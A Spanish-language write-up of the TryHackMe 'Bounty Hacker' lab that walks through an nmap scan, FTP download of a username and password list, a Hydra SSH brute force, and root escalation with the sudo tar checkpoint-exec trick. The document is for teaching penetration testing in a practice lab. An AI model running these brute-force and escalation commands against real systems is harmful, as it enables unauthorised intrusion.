
# 🧪 Write-Up detallado: Bounty Hacker (TryHackMe)

**Nivel:** Principiante  
**Objetivo:** Ganar acceso a un sistema Linux vulnerable mediante FTP, obtener credenciales, acceder por SSH, escalar privilegios y capturar dos flags (usuario y root).  
**Tecnologías involucradas:** FTP, SSH, Linux, Hydra, Escalada vía sudo con tar  
**Categorías:** Pentesting, enumeración de servicios, fuerza bruta, explotación básica, escalada de privilegios.

## 🧭 1. Reconocimiento de superficie

El primer paso fue ejecutar un escaneo de puertos completo usando Nmap para identificar todos los servicios expuestos en la máquina objetivo.

```bash
nmap -sSCV -T4 -p- --min-rate 5000 <IP>
```

Resultado:
- FTP (21)
- SSH (22)
- HTTP (80)

## 📂 2. Acceso y enumeración vía FTP

```bash
ftp <IP>
mget locks.txt task.txt
```

- `task.txt`: nombre de usuario `lin`
- `locks.txt`: posibles contraseñas

## 📝 3. Fuerza bruta SSH con Hydra

```bash
hydra -l lin -P locks.txt ssh://<IP>
```

Credenciales válidas encontradas.

## 📥 4. Acceso SSH y flag de usuario

```bash
ssh lin@<IP>
cat user.txt
```

## 🔓 5. Escalada de privilegios

```bash
sudo -l
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
whoami
```

Shell como root obtenida.

## 🏁 6. Flag final

```bash
cd /root
cat root.txt
```

## ✅ Conclusiones

Refuerza:
- Enumeración de servicios
- Uso de Hydra
- Escalada de privilegios con binarios mal configurados (`tar`)
